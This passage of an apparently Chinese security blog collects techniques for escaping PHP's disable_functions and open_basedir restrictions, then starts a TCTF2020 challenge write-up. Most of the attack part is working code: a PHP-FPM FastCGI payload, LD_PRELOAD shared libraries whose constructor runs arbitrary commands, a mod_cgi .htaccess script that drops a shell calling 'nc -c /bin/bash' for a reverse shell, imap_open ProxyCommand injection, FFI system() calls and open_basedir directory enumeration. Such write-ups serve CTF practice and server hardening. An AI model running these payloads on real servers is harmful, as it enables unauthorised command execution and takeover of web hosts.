        &#39;SERVER_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,
        &#39;SERVER_PORT&#39; =&gt; &#39;80&#39;,
        &#39;SERVER_NAME&#39; =&gt; &#39;mag-tured&#39;,
        &#39;SERVER_PROTOCOL&#39; =&gt; &#39;HTTP/1.1&#39;,
        &#39;CONTENT_TYPE&#39; =&gt; &#39;application/x-www-form-urlencoded&#39;,
        &#39;CONTENT_LENGTH&#39; =&gt; strlen($content),
        &#39;PHP_VALUE&#39; =&gt;&#39;auto_append_file=php://input&#39;,
        &#39;PHP_ADMIN_VALUE&#39;=&gt;&#39;allow_url_include=On&#39;
    )</code></pre>
<h3 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h3><p>这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell</p>
<h3 id="fpm利用脚本"><a href="#fpm利用脚本" class="headerlink" title="fpm利用脚本"></a>fpm利用脚本</h3><p>分享个p牛脚本里面的一个client客户端: <a href="https://github.com/wuyunfeng/Python-FastCGI-Client" target="_blank" rel="noopener">Python FastCGI Client</a><br>还有Lz1y师傅给的一个php客户端 <a href="https://github.com/adoy/PHP-FastCGI-Client.git" target="_blank" rel="noopener">PHP FastCGI Client</a></p>
<p>还要php语言客户端: <a href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans" target="_blank" rel="noopener">fastcgi客户端PHP语言实现</a></p>
<h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？</p>
<p>google给出如下定义</p>
<pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
<p>而putenv可以设置环境变量</p>
<pre><code class="php">putenv ( string $setting ) : bool</code></pre>
<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>那么我们可以进行一下骚操作</p>
<blockquote>
<p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library</p>
</blockquote>
<h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p><code>putenv,errorlog,mail</code></p>
<h4 id="如何制作shared-libraries"><a href="#如何制作shared-libraries" class="headerlink" title="如何制作shared libraries"></a>如何制作shared libraries</h4><p>选择要替换的函数我们这里选取geteuid()</p>
<p>理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数</p>
<pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() {
    system(&quot;ls &gt; result.txt&quot;);
    }
    int  geteuid() {
    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) 
    { return 0; }
    unsetenv(&quot;LD_PRELOAD&quot;);
    payload();
      }</code></pre>
<p>当这个共享库中的 <code>geteuid</code> 被调用时，尝试加载 <code>payload()</code> 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：</p>
<pre><code>gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so</code></pre><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>将恶意的.so文件上传到服务器</p>
<p>执行如下代码,即可载入恶意命令</p>
<pre><code class="php">&lt;?php
putenv(&quot;LD_PRELOAD=/var/www/hack.so&quot;);
mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;</code></pre>
<h4 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p>[<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a href="https://www.k0rz3n.com/2019/02/12/PHP" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP</a> 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)</p>
<p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
<h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#Method2——劫持启动进程" target="_blank" rel="noopener">参考链接</a> </p>
<blockquote>
<p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p>
<p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p>
</blockquote>
<h4 id="由于open-basedir-web目录不可写绕过"><a href="#由于open-basedir-web目录不可写绕过" class="headerlink" title="由于open_basedir+web目录不可写绕过"></a>由于open_basedir+web目录不可写绕过</h4><p>见 bypass open_basedir 的 tmpfile部分</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p>
<pre><code>#define _GNU_SOURCE

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);

    // unset environment variable LD_PRELOAD.
    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {
                    environ[i][0] = &#39;\0&#39;;
            }
    }

    // executive command
    system(cmdline);
}</code></pre><p>接着用以下语句编译C文件为共享对象文件：</p>
<pre><code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</code></pre><p>bypass_disablefunc.php，代码和test.php一致：</p>
<pre><code class="php">&lt;?php
    $cmd = &quot;ls&quot;;
    $out_path = &quot;/tmp/cmdout&quot;;
    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;
    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);
    $so_path = &quot;/var/www/html/bypass_disablefunc.so&quot;;
    putenv(&quot;LD_PRELOAD=&quot; . $so_path);
    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
    unlink($out_path);
?&gt;</code></pre>
<h2 id="apache-php-cgi-mod攻击"><a href="#apache-php-cgi-mod攻击" class="headerlink" title="apache+php cgi mod攻击"></a>apache+php cgi mod攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能</p>
<pre><code class="html">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</code></pre>
<p>然后再看看攻击代码片段</p>
<pre><code class="php">char poststr[] = &quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot; \ &quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot; \ &quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot; \ &quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot; \ &quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot; \ &quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot; \ &quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot; \ &quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot; \ &quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot; \ &quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot; \ &quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot; \ &quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot; \</code></pre>
<p>解码出来是</p>
<pre><code class="php">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=&quot;&quot; -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</code></pre>
<p>这样Kingcope的攻击代码思路就出来了。</p>
<p>关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、apache+php是用cgi模式跑的，例如apache的mod_cgid</p>
<p>2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置</p>
<pre><code class="html">    /cgi-bin/php
    /cgi-bin/php5
    /cgi-bin/php-cgi
    /cgi-bin/php.cgi
    /cgi-bin/php4</code></pre>
<p>3、php版本<br>PHP版本小于5.3.12<br>PHP版本小于5.4.2</p>
<p>或者</p>
<ol>
<li>mod_cgi已经启用 </li>
<li>必须允许.htaccess文件 , 在httpd.conf中，要注意AllowOverride选项为All </li>
<li>必须有权限写.htaccess文件</li>
</ol>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><pre><code class="php">&lt;?php
$cmd = &quot;nc -c&#39;/bin/bash&#39; 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
$shellfile .=&quot;$cmd&quot;; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
}
if(!isset($_GET[&#39;checked&#39;]))
{
    @file_put_contents(&#39;.htaccess&#39;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
    header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;]. &#39;?checked=true&#39;); //执行环境的检查
}
else
{
    $modcgi = in_array(&#39;mod_cgi&#39;,apache_get_modules()); // 检测mod_cgi是否开启
    $writable = is_writable(&#39;.&#39;); //检测当前目录是否可写
    $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]);//检测是否启用了.htaccess
        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
    {
        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
    }
    else
    {

 checkEnabled(&quot;Backing 
up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess

checkEnabled(&quot;Write 
.htaccessfile&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
        checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
        echo &quot;Executing the script now.Check your listener &lt;img src = &#39;shell.dizzle&#39; style =&#39;display:none;&#39;&gt;&quot;; //调用
    }
}
?&gt;</code></pre>
<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote>
<p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 </p>
</blockquote>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>存在ssh和rsh功能 且  enable_insecure_rsh = true</p>
<h3 id="利用脚本-未测试"><a href="#利用脚本-未测试" class="headerlink" title="利用脚本(未测试)"></a>利用脚本(未测试)</h3><pre><code class="php">if (!function_exists(&#39;imap_open&#39;)) {
        die(&quot;no imap_open function!&quot;);
}
$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;
//$server = &#39;x -oProxyCommand=echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &#39;|base64$IFS$()-d|sh}&#39;;
imap_open(&#39;{&#39; . $server . &#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());
sleep(5);
echo file_get_contents(&quot;/tmp/cmd_result&quot;);</code></pre>
<h2 id="利用pcntl插件绕过"><a href="#利用pcntl插件绕过" class="headerlink" title="利用pcntl插件绕过"></a>利用pcntl插件绕过</h2><pre><code>pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</code></pre><h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>FFI::load 无视 opeb_basedir 可以直接加载文件</p>
<p>FFI 相对于 php 更加底层，可以泄露内存</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="php">$ffi=FFI::cdef(&quot;int system(char *command);&quot;,&quot;libc.so.6&quot;);
$ffi-&gt;system(&quot;sleep 5&quot;);</code></pre>
<h3 id="open-basedir，禁用FFI-cdef，目录无法写文件命令执行"><a href="#open-basedir，禁用FFI-cdef，目录无法写文件命令执行" class="headerlink" title="open_basedir，禁用FFI::cdef，目录无法写文件命令执行"></a>open_basedir，禁用FFI::cdef，目录无法写文件命令执行</h3><pre><code>$value=&lt;&lt;&lt;EOF
#define FFI_SCOPE &quot;DUMMY&quot;
#define FFI_LIB &quot;libc.so.6&quot;

int system(const char *command);
EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas[&#39;uri&#39;];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );


$ffi=FFI::load($tmpFilename);
$ffi-&gt;system(&#39;echo bypass_disable_function &gt; /tmp/testing&#39;);

fclose($tmpHandle);</code></pre><h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);
$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));
$a=FFI::string($b-400000,400000);
var_dump($a);
</code></pre>
<h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p>
<h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p>
<h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><pre><code class="php">if (!extension_loaded(&quot;win32std&quot;)) die(&quot;win32std extension required!&quot;);
system(&quot;cmd.exe&quot;); //just to be sure that protections work well
win_shell_execute(&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;);
</code></pre>
<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="https://www.anquanke.com/post/id/197745#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-5</a> </p>
<p> <a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法" target="_blank" rel="noopener">浅谈几种Bypass-disable-functions的方法</a> </p>
<h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfile绕过open-basedir在-tmp目录写文件"><a href="#tmpfile绕过open-basedir在-tmp目录写文件" class="headerlink" title="tmpfile绕过open_basedir在/tmp目录写文件"></a>tmpfile绕过open_basedir在/tmp目录写文件</h2><pre><code>&lt;?php
$value=&lt;&lt;&lt;EOF

EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas[&#39;uri&#39;];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );



fclose($tmpHandle);</code></pre><h2 id="ini-set与chdir-绕过open-basedir"><a href="#ini-set与chdir-绕过open-basedir" class="headerlink" title="ini_set与chdir 绕过open_basedir"></a>ini_set与chdir 绕过open_basedir</h2><pre><code class="php">mkdir(&#39;img&#39;);
chdir(&#39;img&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
</code></pre>
<h2 id="glob协议列根目录"><a href="#glob协议列根目录" class="headerlink" title="glob协议列根目录"></a>glob协议列根目录</h2><pre><code class="php">$it = new DirectoryIterator(&quot;glob:///*&quot;);
foreach ($it as $f){
    echo $f-&gt;__toString().&quot; &quot;;
}
</code></pre>
<h2 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h2><p>realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了<code>open_basedir</code>的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在<code>open_basedir</code>里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，所以这个时候就可以类似于报错盲注去爆出文件名了<br>这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点</p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;,dirname(__FILE__));
printf(&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexist&#39;);
$dir = &#39;d:/test/&#39;;
$file = &#39;&#39;;
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#39;;
for ($i=0; $i&lt;strlen($chars); $i++){
    $file = $dir.$chars[$i].&#39;&lt;&lt;&#39;;
    realpath($file);
}
function isexist($errno, $errstr){
    $regex = &#39;/File\((.*)\) is not within/&#39;;
    printf(&quot;errstr: %s &lt;br/&gt;&quot;,$errstr);
    preg_match($regex, $errstr, $mathes);
    if (isset($mathes[1])){
        printf(&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;, $mathes[1]);
    }
}</code></pre>
<h2 id="SplFileInfo-getRealPath列目录"><a href="#SplFileInfo-getRealPath列目录" class="headerlink" title="SplFileInfo::getRealPath列目录"></a>SplFileInfo::getRealPath列目录</h2><p> SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的<code>realpath</code>很相似，就是<code>getRealPath</code>，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了<code>open_basedir</code>的设定 </p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));
$basedir = &#39;d:/test/&#39;;
$arr = array();
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;
for ($i=0; $i &lt; strlen($chars); $i++) {
    $info = new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&lt;&#39;);
    $re = $info-&gt;getRealPath();
    if ($re) {
        echo $re.&quot;&lt;br&gt;&quot;;
    }
}</code></pre>
<h2 id="GD库imageftbbox-imagefttext列举目录"><a href="#GD库imageftbbox-imagefttext列举目录" class="headerlink" title="GD库imageftbbox/imagefttext列举目录"></a>GD库imageftbbox/imagefttext列举目录</h2><pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexists&#39;);
$dir = &#39;d:/test/&#39;;
$file = &#39;&#39;;
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
for ($i=0; $i &lt; strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
    //$m = imagecreatefrompng(&quot;zip.png&quot;);
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);
    imageftbbox(100, 100, $file, &#39;aaa&#39;);
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, &#39;Invalid font filename&#39;) === FALSE) {
        printf(&quot;%s&lt;br/&gt;&quot;, $file);
    }
}
?&gt;</code></pre>
<h2 id="bindtextdomain暴力猜解目录"><a href="#bindtextdomain暴力猜解目录" class="headerlink" title="bindtextdomain暴力猜解目录"></a>bindtextdomain暴力猜解目录</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p>
<p> 如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。 </p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p>
<p> <a href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain" target="_blank" rel="noopener">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/">http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/" data-id="ckc1hjtqs00005cv00ipr46mf" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-tctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/30/tctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-06-29T16:15:54.495Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/30/tctf2020/">tctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>好难.jpg</p>
<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>这题在我们一堆人的群殴下才做出来</p>
<p>题目主要的http请求是：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p>
<p>与</p>
<pre><code>http://pwnable.org:5000/image/VMyeGe/xxx
xxx是后缀，具体列表在：https://imagemagick.org/script/formats.php</code></pre><h3 id="第一部分-ImageMagick读取文件"><a href="#第一部分-ImageMagick读取文件" class="headerlink" title="第一部分 ImageMagick读取文件"></a>第一部分 ImageMagick读取文件</h3><p>测试share发现，无论我们输入的previewid时候存在，都会生成一个短链</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p>
